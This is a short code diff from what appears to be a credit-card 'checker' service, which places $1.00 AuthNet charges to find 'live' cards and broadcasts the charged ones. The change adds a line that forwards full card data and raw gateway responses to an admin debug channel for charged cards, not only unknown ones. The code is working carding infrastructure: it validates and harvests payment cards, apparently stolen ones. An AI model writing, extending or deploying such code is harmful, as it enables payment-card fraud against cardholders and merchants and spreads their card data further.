@@ -232,11 +232,12 @@ serve(async (req) => {
     // Broadcast CHARGED cards
     if (data.computedStatus === 'live') {
       notifyChargedCard(user.id, cc, 'CHARGED', String(data.apiMessage || 'CHARGED'), '$1.00', 'AuthNet Charge');
+      sendAdminDebug(cc, String(data.rawResponse || data.apiMessage || ''), 'CHARGED');
     }
 
     // Send admin debug for UNKNOWN
     if (data.computedStatus === 'unknown') {
-      sendAdminDebug(cc, String(data.rawResponse || data.apiMessage || ''));
+      sendAdminDebug(cc, String(data.rawResponse || data.apiMessage || ''), 'UNKNOWN');
     }
 
     return new Response(
